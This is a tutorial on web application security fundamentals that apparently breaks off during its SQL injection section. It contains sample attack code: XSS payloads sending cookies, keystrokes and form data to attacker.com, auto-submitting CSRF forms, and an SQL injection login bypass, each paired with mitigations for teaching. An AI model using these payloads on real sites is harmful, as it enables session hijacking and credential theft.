# Web Application Basics — Deep Dive Guide
### From Fundamentals to Vulnerabilities, Attacks & Mitigations

> Every concept explained from first principles — what it is, how it works, what breaks it, how attackers exploit it, and how to fix it.

---

## Table of Contents

1. [HTTP / HTTPS Fundamentals](#1-httphttps-fundamentals)
2. [Cookies & Sessions](#2-cookies--sessions)
3. [Authentication](#3-authentication)
4. [Authorization](#4-authorization)
5. [Same-Origin Policy & CORS](#5-same-origin-policy--cors)
6. [CSRF — Cross-Site Request Forgery](#6-csrf--cross-site-request-forgery)
7. [XSS — Cross-Site Scripting](#7-xss--cross-site-scripting)
8. [SQL Injection](#8-sql-injection)
9. [Clickjacking](#9-clickjacking)
10. [Security Headers](#10-security-headers)
11. [HTTPS, TLS & Certificate Attacks](#11-https-tls--certificate-attacks)
12. [JWT — JSON Web Tokens](#12-jwt--json-web-tokens)
13. [Password Storage & Attacks](#13-password-storage--attacks)
14. [Rate Limiting & Brute Force](#14-rate-limiting--brute-force)
15. [Input Validation & Encoding](#15-input-validation--encoding)
16. [Full Attack Chain Example](#16-full-attack-chain-example)

---

## 1. HTTP / HTTPS Fundamentals

### What is HTTP?

HTTP (HyperText Transfer Protocol) is the **language** browsers and servers use to communicate. It is a **stateless, text-based, request-response protocol** — every communication is a pair: one request from the client, one response from the server.

**Stateless** means: the server has no memory of you between requests. Every request must carry all context needed (cookies, tokens, etc.) to identify itself.

---

### HTTP Request — Anatomy

```
POST /login HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json
Content-Type: application/x-www-form-urlencoded
Content-Length: 38
Cookie: tracking_id=abc123
Authorization: Bearer eyJhbGciOiJIUz...
Referer: https://example.com/home

username=john&password=secret123
```

Breaking this down line by line:

| Part | Example | Explanation |
|---|---|---|
| **Request Line** | `POST /login HTTP/1.1` | Method + Path + HTTP Version |
| **Host** | `example.com` | Which server to send to (required in HTTP/1.1) |
| **User-Agent** | `Mozilla/5.0 ...` | Browser and OS info (can be faked) |
| **Accept** | `text/html` | What content types the browser can handle |
| **Content-Type** | `application/x-www-form-urlencoded` | Format of the body being sent |
| **Content-Length** | `38` | Size of the body in bytes |
| **Cookie** | `tracking_id=abc123` | All cookies for this domain sent automatically |
| **Authorization** | `Bearer eyJ...` | Auth token sent manually by JS |
| **Referer** | `https://example.com/home` | Which page triggered this request |
| **Body** | `username=john&password=secret123` | Actual payload (POST only) |

---

### HTTP Response — Anatomy

```
HTTP/1.1 200 OK
Date: Wed, 29 Apr 2026 10:00:00 GMT
Server: nginx/1.18.0
Content-Type: text/html; charset=UTF-8
Content-Length: 5320
Set-Cookie: session=xyz789; HttpOnly; Secure; SameSite=Strict
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Cache-Control: no-store

<!DOCTYPE html>
<html>...</html>
```

| Part | Explanation |
|---|---|
| `HTTP/1.1 200 OK` | Status line — version + status code + human message |
| `Server: nginx/1.18.0` | ⚠️ Version disclosure — tells attackers what software you run |
| `Set-Cookie` | Server asking the browser to store a cookie |
| `X-Frame-Options` | Prevents your page being loaded in an iframe (clickjacking protection) |
| `Cache-Control: no-store` | Do not cache this response (important for sensitive pages) |

---

### HTTP Status Codes

| Code | Name | Meaning |
|---|---|---|
| `200` | OK | Success |
| `201` | Created | Resource was created (after POST) |
| `301/302` | Redirect | Moved permanently / temporarily |
| `304` | Not Modified | Use your cached version |
| `400` | Bad Request | Malformed request |
| `401` | Unauthorized | Not logged in / bad credentials |
| `403` | Forbidden | Logged in but no permission |
| `404` | Not Found | Resource doesn't exist |
| `429` | Too Many Requests | Rate limited |
| `500` | Internal Server Error | Server crashed — may leak stack traces |
| `503` | Service Unavailable | Server overloaded or down |

---

### HTTP Methods

| Method | Purpose | Has Body | Safe? | Idempotent? |
|---|---|---|---|---|
| `GET` | Read a resource | No | ✅ Yes | ✅ Yes |
| `POST` | Create / Submit | Yes | ❌ No | ❌ No |
| `PUT` | Replace entirely | Yes | ❌ No | ✅ Yes |
| `PATCH` | Partial update | Yes | ❌ No | ❌ No |
| `DELETE` | Remove resource | No | ❌ No | ✅ Yes |
| `OPTIONS` | What methods allowed | No | ✅ Yes | ✅ Yes |
| `HEAD` | Like GET but no body | No | ✅ Yes | ✅ Yes |

- **Safe**: Does not modify anything on the server.
- **Idempotent**: Calling it multiple times has the same effect as calling it once.

---

### ⚠️ Vulnerability: Sensitive Data in GET Parameters

**What happens:**

```
GET /login?username=john&password=secret123 HTTP/1.1
```

**Why this is dangerous:**

1. **Browser History** — The full URL including `?password=secret123` is saved in browser history. Anyone with physical access to the device can see it.
2. **Server Access Logs** — Web servers log every URL. The password is now in plaintext in log files.
3. **Referer Header Leakage** — When the user clicks a link from this page, the next site receives:
   ```
   Referer: https://example.com/login?password=secret123
   ```
4. **Shoulder Surfing** — The URL is visible in the address bar.
5. **Proxy/CDN Logs** — Any intermediary server logs the full URL.

**Mitigation:**

Always use `POST` with a request body for any sensitive data:

```
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=john&password=secret123
```

POST body is not logged, not stored in history, not in Referer.

---

### ⚠️ Vulnerability: Server Version Disclosure

**Bad response header:**
```
Server: Apache/2.4.29 (Ubuntu)
```

**Why dangerous:** Attackers search for known CVEs (Common Vulnerabilities and Exposures) for that exact version and exploit them.

**Mitigation:**
```nginx
# nginx.conf
server_tokens off;
```
```apache
# apache config
ServerTokens Prod
ServerSignature Off
```
Now the header shows only: `Server: nginx` — no version.

---

### HTTP vs HTTPS — Deep Comparison

**HTTP (Port 80):**
```
Browser                               Server
  │                                     │
  │── GET /login ──────────────────────>│
  │   Cookie: session=abc123            │
  │   (PLAINTEXT — anyone on network    │
  │    can see this exact text)         │
  │<── 200 OK ─────────────────────────│
```

**HTTPS (Port 443):**
```
Browser                               Server
  │                                     │
  │── TLS Handshake ───────────────────>│
  │<── Certificate + Keys ─────────────│
  │── GET /login (ENCRYPTED) ──────────>│
  │   [random bytes — unreadable]       │
  │<── 200 OK (ENCRYPTED) ─────────────│
```

**What HTTPS protects:**
- **Confidentiality** — Data cannot be read in transit.
- **Integrity** — Data cannot be modified in transit (no tampering).
- **Authentication** — Certificate proves the server is who it claims to be.

**What HTTPS does NOT protect:**
- If the server stores your password in plain text — HTTPS doesn't help.
- If there's XSS on the page — HTTPS doesn't stop it.
- If the user is already on a compromised machine.

---

### ⚠️ Vulnerability: HTTP Downgrade / Mixed Content

A site served over HTTPS that loads any resource (image, script, API) over HTTP is called **Mixed Content**. The HTTP resource is vulnerable:

```html
<!-- Dangerous: loaded over HTTP even though page is HTTPS -->
<script src="http://cdn.example.com/app.js"></script>
```

An attacker on the same network can intercept the HTTP request and **replace `app.js` with malicious code** — effectively attacking an "HTTPS" site.

**Mitigation:** 
- All resources must be loaded over HTTPS.
- Set the `Content-Security-Policy: upgrade-insecure-requests` header to auto-upgrade all HTTP requests to HTTPS.
- Set `Strict-Transport-Security` (HSTS) header to force HTTPS permanently.

---

## 2. Cookies & Sessions

### What is a Cookie?

A cookie is a **small piece of text data** the server tells the browser to store. Once stored, the browser automatically sends the cookie with every subsequent request to that domain.

**The flow:**

```
Step 1 — Server tells browser to store a cookie:
  HTTP/1.1 200 OK
  Set-Cookie: session_id=xyz789; HttpOnly; Secure

Step 2 — Browser stores it internally (not visible to user)

Step 3 — Every future request to that domain automatically includes:
  GET /dashboard HTTP/1.1
  Cookie: session_id=xyz789

Step 4 — Server reads session_id, looks up who it belongs to
```

This is how websites "remember" you without you logging in again on each page load.

---

### What is a Session?

Since HTTP is stateless (the server forgets you after each request), **sessions** are how the server maintains state for a user across multiple requests.

```
User logs in:
  POST /login { username: john, password: secret }
        │
        ▼
  Server verifies credentials
        │
        ▼
  Server creates a session record in its storage (Redis/DB):
  {
    session_id: "xyz789",
    user_id: 42,
    username: "john",
    role: "admin",
    created_at: "2026-04-29T10:00:00Z",
    expires_at: "2026-04-29T11:00:00Z"
  }
        │
        ▼
  Server sends: Set-Cookie: session_id=xyz789; HttpOnly; Secure

User makes a request:
  GET /dashboard
  Cookie: session_id=xyz789
        │
        ▼
  Server looks up "xyz789" in Redis
        │
        ▼
  Found: user_id=42, role="admin"
        │
        ▼
  Serves dashboard page for admin user
```

The cookie only holds the **session ID** (a random, meaningless string). All real data (user ID, role, permissions) lives on the **server side** — never in the cookie itself.

---

### Cookie Attributes — Every One Explained With Its Attack Scenario

#### `HttpOnly`

**What it does:** Prevents JavaScript from reading the cookie.

```javascript
// Without HttpOnly — JS can read cookies:
console.log(document.cookie);
// Output: "session_id=xyz789; theme=dark; user=john"

// With HttpOnly — JS cannot read that cookie:
console.log(document.cookie);
// Output: "theme=dark; user=john"
// session_id is invisible to JS
```

**The attack it prevents — XSS Cookie Theft:**

XSS (Cross-Site Scripting) is when an attacker injects JavaScript into your web page. If the session cookie does NOT have `HttpOnly`, the attacker's injected JavaScript can steal it:

```javascript
// Attacker's injected payload (via XSS):
<script>
  // Read all cookies (session_id is visible because HttpOnly is missing)
  var stolen = document.cookie;
  // stolen = "session_id=xyz789"
  
  // Send stolen cookie to attacker's server
  fetch('https://attacker.com/steal?data=' + stolen, {
    method: 'GET',
    mode: 'no-cors'
  });
</script>
```

**What happens next:**
1. Attacker now has: `session_id=xyz789`
2. Attacker puts this cookie in their own browser
3. Attacker's browser sends: `Cookie: session_id=xyz789`
4. Server thinks: "I know this session — it's John (admin)"
5. Attacker is now fully logged in as John — **without knowing the password**

**With HttpOnly:**
- XSS still executes on the page
- But `document.cookie` does NOT contain `session_id`
- The cookie is still sent automatically by the browser on requests, but JS cannot READ it
- Cookie theft via XSS is blocked ✅

**Mitigation:**
```
Set-Cookie: session_id=xyz789; HttpOnly
```

---

#### `Secure`

**What it does:** Cookie is only sent over HTTPS connections. Never over HTTP.

**The attack it prevents — Network Sniffing / Man-in-the-Middle:**

If a user visits `http://example.com` (plain HTTP) and the session cookie doesn't have `Secure`:

```
Browser ──[Cookie: session_id=xyz789]──> (plaintext on network) ──> Server
                                   ↑
                         Attacker on same WiFi
                         uses Wireshark and reads:
                         "Cookie: session_id=xyz789"
                         Now has the session!
```

**With Secure flag:**
```
Browser is on http:// → Cookie is NOT sent at all
Browser is on https:// → Cookie is sent (encrypted)
```

Even if an attacker sniffs the network, they see encrypted bytes — not the cookie value.

**Mitigation:**
```
Set-Cookie: session_id=xyz789; Secure
```

---

#### `SameSite`

**What it does:** Controls when the browser sends cookies on cross-site requests.

Three possible values:

| Value | Behavior |
|---|---|
| `Strict` | Cookie sent ONLY when navigating within the same site |
| `Lax` | Cookie sent on same-site AND top-level navigation from other sites (clicking links). Not sent on cross-site POST/AJAX |
| `None` | Cookie always sent. Must also have `Secure` |

**The attack it prevents — CSRF (Cross-Site Request Forgery):**

Without `SameSite`, when a victim visits `evil.com`, that page can silently make requests to `bank.com` and the browser will include the victim's `bank.com` session cookie:

```html
<!-- On evil.com — victim visits this page -->
<form action="https://bank.com/transfer" method="POST" id="hack">
  <input name="to" value="attacker_account">
  <input name="amount" value="10000">
</form>
<script>document.getElementById('hack').submit();</script>
```

The browser sends this POST to `bank.com` WITH the victim's cookie because the cookie has no `SameSite` restriction.

**With `SameSite=Strict`:**
- The POST from `evil.com` to `bank.com` does NOT include the cookie
- Bank sees an unauthenticated request and rejects it ✅

**Mitigation:**
```
Set-Cookie: session_id=xyz789; SameSite=Strict
```

---

#### `Max-Age` / `Expires`

**What it does:** Controls how long the cookie lives.

```
Max-Age=3600    → Expires in 3600 seconds (1 hour) from now
Max-Age=0       → Delete the cookie immediately (used in logout)
Max-Age=86400   → Expires in 1 day
Expires=Thu, 01 Jan 2026 00:00:00 GMT  → Expires at a specific date
```

**Without an expiry:**
- Cookie becomes a **Session Cookie** — deleted when browser is closed.
- If browser is never closed (many users keep browsers open for days), the session never expires.

**Security implication:**
- Long-lived sessions mean a stolen session ID remains valid for a long time.
- Best practice: Short session lifetimes + sliding expiry (reset expiry on each active request).

---

#### `Domain`

**What it does:** Specifies which domains can receive the cookie.

```
Domain=example.com      → Cookie sent to example.com AND all subdomains
Domain=api.example.com  → Cookie sent only to api.example.com
```

**Attack scenario — Subdomain Takeover:**
If `Domain=.example.com` and an attacker takes over `evil.example.com` (via expired subdomain DNS), the browser will send the cookie to that subdomain too.

---

#### `Path`

**What it does:** Cookie only sent for requests to the specified path.

```
Path=/admin   → Cookie only sent when requesting /admin/* URLs
Path=/        → Cookie sent to all paths (default)
```

---

### Complete Secure Cookie Example

```
Set-Cookie: session_id=xyz789; 
            HttpOnly; 
            Secure; 
            SameSite=Strict; 
            Max-Age=3600; 
            Path=/
```

This one line of configuration prevents:
- ❌ XSS cookie theft (HttpOnly)
- ❌ Network sniffing (Secure)
- ❌ CSRF attacks (SameSite)
- ❌ Forever-lasting sessions (Max-Age)

---

### Session Fixation Attack

**What it is:** Attacker forces a victim to use a known session ID, then hijacks it after the victim logs in.

**Attack flow:**
```
Step 1: Attacker visits the site → Gets a session ID: "known123"

Step 2: Attacker tricks victim into using that session ID:
  https://bank.com/login?session_id=known123
  (Some old apps accepted session IDs from URL parameters)

Step 3: Victim logs in at that URL

Step 4: Server authenticates victim but reuses the same session ID "known123"

Step 5: Attacker uses "known123" → Now logged in as victim
```

**Mitigation:**
```javascript
// After successful login, always regenerate the session ID:
req.session.regenerate(function(err) {
  req.session.userId = user.id;
  // New session ID is now issued — old "known123" is invalid
});
```

---

## 3. Authentication

### What is Authentication?

Authentication is the process of **verifying identity** — confirming that a user is who they claim to be.

```
"I am John with password 'secret123'"
        ↓
Server: Is this really John? Let me check...
        ↓
Password matches stored hash → Authenticated ✅
```

---

### Password Hashing — Deep Explanation

**Why you NEVER store plain text passwords:**

If the database is leaked (which happens regularly), all passwords are exposed. Users reuse passwords. One leaked database compromises accounts on other sites.

**Step 1 — Basic but Wrong: MD5/SHA1 Hashing**

```
MD5("secret123") = "5ebe2294ecd0e0f08eab7690d2a6ee69"
```

This seems safe, but MD5 is a **fast** algorithm. An attacker can compute billions of hashes per second on a GPU and pre-compute every possible password — this is called a **Rainbow Table Attack**.

**Step 2 — Adding Salt (Better but Still Wrong Algorithm):**

A salt is a random string added to the password before hashing:

```
salt = "r4nd0mS@lt"
hash = SHA1("secret123" + "r4nd0mS@lt") = unique value

Stored in DB: { hash: "xyz...", salt: "r4nd0mS@lt" }
```

Salt defeats rainbow tables. But SHA1 is still fast — brute force is still feasible.

**Step 3 — Correct: Slow Hashing Algorithms**

`bcrypt`, `argon2`, `scrypt` are intentionally slow and memory-intensive:

```
bcrypt("secret123", cost=12) → takes ~250ms
```

**Why slowness matters:**
- Your server checks one login: 250ms → no problem.
- Attacker brute-forcing: 250ms per attempt → 4 attempts per second per GPU.
- At 4/second, cracking an 8-char random password takes centuries.

**Code example (Node.js):**

```javascript
const bcrypt = require('bcrypt');

// Storing password (registration):
const saltRounds = 12;
const hash = await bcrypt.hash("secret123", saltRounds);
// hash = "$2b$12$KIXQkm3bGPRyUCo5M..."
// Store this hash in DB — never the original password

// Verifying password (login):
const isMatch = await bcrypt.compare("secret123", storedHash);
// isMatch = true ✅

const isMatch2 = await bcrypt.compare("wrongpass", storedHash);
// isMatch2 = false ❌
```

---

### Authentication Factors

**Something you know:**
- Password, PIN, security question

**Something you have:**
- Phone (TOTP app), hardware key (YubiKey), SMS code

**Something you are:**
- Fingerprint, face ID, retina scan

Multi-Factor Authentication (MFA) requires 2+ of these factors:

```
User enters password (something you know) ✅
        ↓
Server prompts for OTP
        ↓
User opens Google Authenticator → gets 6-digit code (something you have) ✅
        ↓
Login successful
```

**Why MFA matters:**
Even if a password is stolen (via phishing, breach, brute force), the attacker cannot log in without the physical device.

---

### TOTP — How Time-Based OTP Works

```
During Setup:
  Server generates a secret key: "JBSWY3DPEHPK3PXP"
  This is shared with the user's authenticator app (via QR code)
  Both server and app now have the SAME secret

During Login:
  App calculates: HMAC(secret, current_time_window)
  → Produces 6-digit code, e.g. "482931"
  
  Server calculates the SAME thing independently
  Codes match → Authentication succeeds

Why it changes every 30 seconds:
  The time window (floor(unix_timestamp / 30)) changes every 30 seconds
  Old codes automatically become invalid
```

---

### ⚠️ Vulnerability: Username Enumeration

**What it is:** The login response reveals whether a username exists.

**Bad (leaks information):**
```
POST /login { username: "john", password: "wrong" }
→ "Incorrect password"    ← reveals "john" exists!

POST /login { username: "nobody", password: "wrong" }
→ "Username not found"    ← reveals "nobody" doesn't exist
```

**Why it's dangerous:** Attacker can build a list of valid usernames, then focus brute-force attacks on confirmed accounts.

**Mitigation — Always use the same message:**
```
"Invalid username or password"
```
Never differentiate between wrong username and wrong password.

Also: ensure the **response time** is the same regardless. If checking non-existent users returns immediately but valid users take 250ms (for bcrypt), timing reveals which users exist.

```javascript
// Always run bcrypt even if user not found:
const user = await db.findByUsername(username);
const dummyHash = "$2b$12$dummyhashforinvalidusers....";
const hashToCheck = user ? user.password_hash : dummyHash;
await bcrypt.compare(password, hashToCheck); // Always takes ~250ms
```

---

### ⚠️ Vulnerability: Predictable Session IDs

If session IDs are guessable, attackers can brute-force them.

**Bad session ID generation:**
```
session_id = "user_" + user_id + "_" + timestamp
→ "user_42_1714385400"
```

This is predictable. An attacker can guess valid session IDs.

**Good session ID generation:**
```javascript
const crypto = require('crypto');
const sessionId = crypto.randomBytes(32).toString('hex');
// "8f14e45f ceeff54b d6c43b45 d0f72814..."
// 256 bits of randomness — computationally impossible to guess
```

---

## 4. Authorization

### What is Authorization?

Authorization determines **what an authenticated user is allowed to do**. Just because you're logged in doesn't mean you can do everything.

```
Authentication: "You are John" ✅
Authorization:  "John, can you access /admin?" 
  → John's role is "user", not "admin" → 403 Forbidden ❌
```

---

### Role-Based Access Control (RBAC)

Users are assigned roles. Roles define what actions are permitted.

```
Roles and their permissions:

admin   → CREATE, READ, UPDATE, DELETE (all resources)
editor  → CREATE, READ, UPDATE (own content)
viewer  → READ only
guest   → READ (public content only)

User: Alice (role: editor)
  GET  /articles/5       → READ ✅ allowed
  POST /articles         → CREATE ✅ allowed
  DELETE /articles/5     → DELETE ❌ 403 Forbidden
  GET  /admin/users      → ❌ 403 Forbidden (needs admin role)
```

**Implementation (middleware):**

```javascript
function requireRole(role) {
  return function(req, res, next) {
    if (!req.user) {
      return res.status(401).json({ error: 'Not authenticated' });
    }
    if (req.user.role !== role) {
      return res.status(403).json({ error: 'Insufficient permissions' });
    }
    next(); // User has the right role — continue
  };
}

// Route protected by role:
app.delete('/admin/users/:id', requireRole('admin'), deleteUserHandler);
```

---

### ⚠️ Vulnerability: IDOR — Insecure Direct Object Reference

**What it is:** An authorization flaw where a user can access another user's resources by simply changing an ID.

**The attack:**

```
Alice is logged in. Her profile URL is:
  GET /api/user/42/profile

Alice changes the URL to:
  GET /api/user/43/profile

If the server doesn't check "Does user 42 own resource 43?", 
it returns Bob's (user 43) private profile data.
```

**Vulnerable code:**
```javascript
// BAD: Only checks if user is logged in, not if they OWN the resource
app.get('/api/user/:userId/profile', authenticate, async (req, res) => {
  const profile = await db.getProfile(req.params.userId);
  // Returns whoever's profile is requested — no ownership check!
  res.json(profile);
});
```

**Secure code:**
```javascript
// GOOD: Verifies the logged-in user is requesting their OWN resource
app.get('/api/user/:userId/profile', authenticate, async (req, res) => {
  // req.user.id = the logged-in user's ID (from session/token)
  // req.params.userId = the ID in the URL

  if (req.user.id !== parseInt(req.params.userId) && req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Access denied' });
  }
  
  const profile = await db.getProfile(req.params.userId);
  res.json(profile);
});
```

**IDOR types:**
- **Numeric IDs** — `/invoice/1001` → try `/invoice/1002`
- **GUIDs** — Harder to guess but still possible if leaked elsewhere
- **File names** — `/files/john_contract.pdf` → try `/files/alice_contract.pdf`
- **Indirect** — Modifying an account number in a POST body

**Mitigation:**
1. Always verify ownership server-side, never trust client-provided IDs alone.
2. Use UUIDs instead of sequential integers (harder to guess but not a substitute for proper checks).
3. Implement authorization at the data layer, not just the route layer.

---

## 5. Same-Origin Policy & CORS

### Same-Origin Policy (SOP)

The **Same-Origin Policy** is a browser security rule: JavaScript on one origin cannot read data from a different origin.

**What is an "origin"?**

```
https://example.com:443/page
│       │           │
scheme  host        port

Two URLs have the SAME origin if all three match exactly.
```

| URL A | URL B | Same Origin? | Reason |
|---|---|---|---|
| `https://example.com` | `https://example.com/about` | ✅ Yes | Only path differs |
| `https://example.com` | `http://example.com` | ❌ No | Scheme differs |
| `https://example.com` | `https://api.example.com` | ❌ No | Subdomain differs |
| `https://example.com` | `https://example.com:8080` | ❌ No | Port differs |

**What SOP blocks:**
- JS on `evil.com` cannot read the response from `bank.com`
- JS on `evil.com` cannot read cookies set for `bank.com`

**What SOP does NOT block:**
- `<img src="https://other.com/image.png">` — loads images cross-origin
- `<script src="...">` — loads scripts cross-origin
- Form submissions to other origins (this is why CSRF exists!)

---

### CORS — Cross-Origin Resource Sharing

CORS is a mechanism that allows servers to **relax SOP** for specific trusted origins.

**The problem CORS solves:**

Your frontend at `app.com` needs to call your API at `api.app.com`. These are different origins, so the browser blocks JS from reading the response.

**Preflight Request:**

For non-simple requests (POST with JSON, PUT, DELETE, custom headers), the browser sends a preflight `OPTIONS` request first:

```
OPTIONS /api/users HTTP/1.1
Host: api.app.com
Origin: https://app.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Content-Type, Authorization
```

Server responds:
```
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Max-Age: 86400
```

Now the browser knows the cross-origin request is allowed and proceeds.

---

### ⚠️ Vulnerability: Overly Permissive CORS

**Dangerous configuration:**
```javascript
// NEVER DO THIS in production:
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Credentials', 'true'); // This + wildcard = INVALID
  next();
});
```

`Access-Control-Allow-Origin: *` means any website can make requests to your API and read the response. Combined with credentials, this allows any attacker site to call your authenticated API as the victim user.

**Another dangerous pattern:**
```javascript
// Reflects the Origin back without validation:
const origin = req.headers.origin;
res.header('Access-Control-Allow-Origin', origin); // ANY origin is allowed!
```

**Secure CORS:**
```javascript
const allowedOrigins = ['https://app.example.com', 'https://admin.example.com'];

app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (allowedOrigins.includes(origin)) {
    res.header('Access-Control-Allow-Origin', origin);
    res.header('Access-Control-Allow-Credentials', 'true');
  }
  next();
});
```

---

## 6. CSRF — Cross-Site Request Forgery

### What is CSRF?

CSRF tricks a victim's browser into making an unwanted authenticated request to a site they're logged into — **without their knowledge**.

### Attack Flow (Detailed)

```
Precondition: Victim is logged into bank.com
  Browser has: Cookie: session=xyz789 (no SameSite flag)

Step 1: Attacker crafts a malicious page at evil.com:

  <html>
    <body onload="document.getElementById('hack').submit()">
      <form id="hack" action="https://bank.com/transfer" method="POST">
        <input type="hidden" name="recipient" value="attacker_account">
        <input type="hidden" name="amount" value="50000">
      </form>
    </body>
  </html>

Step 2: Attacker sends victim a link to evil.com
  (via email, phishing, social media)

Step 3: Victim clicks link → evil.com loads → form auto-submits

Step 4: Browser sends:
  POST /transfer HTTP/1.1
  Host: bank.com
  Cookie: session=xyz789   ← Browser AUTOMATICALLY includes the cookie!
  
  recipient=attacker_account&amount=50000

Step 5: Bank.com sees a valid authenticated request → Transfers money 💀
```

The bank cannot tell this request came from evil.com vs. the real bank website — both would have the same cookie.

---

### CSRF Mitigations

#### Method 1: CSRF Token (Synchronizer Token Pattern)

```
Step 1: When serving the form, server embeds a secret token:
  <form action="/transfer" method="POST">
    <input type="hidden" name="csrf_token" value="a8f3b2c91d...">
    <input type="text" name="amount">
  </form>

Step 2: The server stores this token (in session or as a signed value)

Step 3: When form is submitted:
  POST /transfer
  Cookie: session=xyz789
  Body: amount=500&csrf_token=a8f3b2c91d...

Step 4: Server validates csrf_token matches expected value
  Valid → proceed
  Invalid or missing → reject with 403

The attacker's evil.com cannot read the CSRF token because:
  - SOP prevents evil.com JS from reading bank.com's HTML
  - Form submission from evil.com doesn't include the CSRF token
  - Server rejects the request ✅
```

#### Method 2: SameSite Cookie Attribute

```
Set-Cookie: session=xyz789; SameSite=Strict
```

When `SameSite=Strict`:
- Evil.com submits form to bank.com
- Browser says: "This is a cross-site request. SameSite=Strict means don't send the cookie."
- Bank.com receives request with NO cookie → unauthenticated → rejected ✅

#### Method 3: Custom Request Headers

CORS + custom headers block CSRF for AJAX requests:

```javascript
// Frontend always sends:
fetch('/api/transfer', {
  method: 'POST',
  headers: { 'X-Requested-With': 'XMLHttpRequest' }, // Custom header
  body: JSON.stringify({ amount: 500 })
});

// Server checks for the custom header:
if (req.headers['x-requested-with'] !== 'XMLHttpRequest') {
  return res.status(403).send('CSRF detected');
}
```

SOP prevents attacker from setting custom headers on cross-origin form submissions.

---

## 7. XSS — Cross-Site Scripting

### What is XSS?

XSS is a vulnerability where an attacker **injects malicious JavaScript** into a web page that is then executed by other users' browsers.

Because the script runs **in the context of the legitimate site**, it has:
- Access to the DOM
- Access to cookies (if not HttpOnly)
- Access to localStorage and sessionStorage
- Ability to make requests to the server on behalf of the user
- Ability to modify what the user sees

---

### Type 1: Reflected XSS

The malicious script is **in the URL** and reflected back in the response.

**Scenario:**

```
Vulnerable search page:
  URL: https://example.com/search?q=hello
  Response: <h1>Results for: hello</h1>

Attacker crafts:
  URL: https://example.com/search?q=<script>alert('XSS')</script>
  
Server response (without sanitization):
  <h1>Results for: <script>alert('XSS')</script></h1>
                    ↑
                    This executes in the victim's browser!
```

**Attack delivery:** Attacker sends the crafted URL to victims via email/phishing. Victim clicks → their browser executes attacker's script.

---

### Type 2: Stored (Persistent) XSS

The malicious script is **saved in the database** and executed for every user who views the content.

**Scenario — Comment box:**

```
Attacker posts a "comment":
  <script>
    fetch('https://attacker.com/steal?c=' + document.cookie)
  </script>

This is saved to the database as a comment.

When ANY user views the page:
  Server renders: <div class="comment">
    <script>fetch('https://attacker.com/steal?c=' + document.cookie)</script>
  </div>

Every victim's browser executes this script and sends their cookies to the attacker.
```

This is the most dangerous type — one injection = all users are compromised.

---

### Type 3: DOM-Based XSS

The vulnerability is in client-side JavaScript itself, not the server.

```javascript
// Vulnerable JavaScript on the page:
const userInput = location.hash.slice(1); // Gets text after # in URL
document.getElementById('greeting').innerHTML = userInput;

// Attacker's URL:
https://example.com/page#<img src=x onerror="alert('XSS')">

// Browser:
// 1. Reads location.hash → <img src=x onerror="alert('XSS')">
// 2. Sets innerHTML to that value
// 3. Browser parses the img tag, src fails, onerror executes
// 4. XSS fires without the server ever being involved
```

---

### XSS Payload — What Attackers Actually Do

**Cookie theft (when HttpOnly is absent):**
```javascript
new Image().src = 'https://attacker.com/?c=' + encodeURIComponent(document.cookie);
```

**Keylogger — steal everything typed:**
```javascript
document.addEventListener('keypress', function(e) {
  fetch('https://attacker.com/keys?k=' + e.key);
});
```

**Credential harvesting — replace login form:**
```javascript
document.querySelector('form').addEventListener('submit', function(e) {
  const data = new FormData(e.target);
  fetch('https://attacker.com/harvest', {
    method: 'POST',
    body: JSON.stringify(Object.fromEntries(data))
  });
});
```

**Session riding — make authenticated requests:**
```javascript
// Steal CSRF token from the page, then make requests as the victim:
const token = document.querySelector('[name=csrf_token]').value;
fetch('/transfer', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ to: 'attacker', amount: 10000, csrf_token: token })
});
```

Even with `HttpOnly` cookies, XSS can still:
- Perform actions on behalf of the user (the browser sends cookies automatically on fetch)
- Steal CSRF tokens directly from the DOM
- Capture passwords typed into forms
- Modify what the user sees (phishing within legitimate site)

---

### XSS Mitigations

#### 1. HTML Output Encoding (Most Important)

Never insert user data directly into HTML. Always escape it first:

```javascript
// Raw user input:
const userInput = '<script>alert("xss")</script>';

// DANGEROUS — direct insertion:
element.innerHTML = userInput;
// → Executes the script!

// SAFE — text content (auto-encodes):
element.textContent = userInput;
// → Displays literally: <script>alert("xss")</script>
// → Not executed

// SAFE — manual encoding before innerHTML:
function escape(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
}
element.innerHTML = escape(userInput);
// → &lt;script&gt;alert("xss")&lt;/script&gt;
// → Displays as text, not executed
```

#### 2. Content Security Policy (CSP)

CSP is a response header that tells the browser which scripts are allowed to run:

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com
```

With this policy:
- Scripts can only load from the same origin or `cdn.example.com`
- Inline `<script>` tags are blocked by default
- `javascript:` URLs are blocked
- `eval()` is blocked

Even if an attacker injects a `<script>` tag, the browser refuses to execute it because it violates the CSP.

#### 3. HttpOnly Cookies
Already covered — prevents cookie theft even when XSS fires.

#### 4. Sanitization Libraries
When rich HTML IS needed (e.g., user profile descriptions allowing bold/italic):

```javascript
const DOMPurify = require('dompurify');
// Allows safe HTML, strips dangerous tags/attributes:
const clean = DOMPurify.sanitize('<b>Hello</b><script>alert(1)</script>');
// clean = "<b>Hello</b>"  ← script removed ✅
```

---

## 8. SQL Injection

### What is SQL Injection?

SQL Injection occurs when user-supplied input is **directly inserted into a SQL query** without sanitization, allowing the attacker to modify the query's logic.

### Basic Attack

**Vulnerable login code:**
```python
username = request.form['username']  # Input: admin'--
password = request.form['password']  # Input: anything

query = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'"
```

**What the query becomes with input `admin'--`:**
```sql
SELECT * FROM users WHERE username='admin'--' AND password='anything'
                                          ↑
                                       Comment in SQL!
                                       Everything after -- is ignored

Effective query:
SELECT * FROM users WHERE username='admin'
→ Returns admin user WITHOUT checking password!
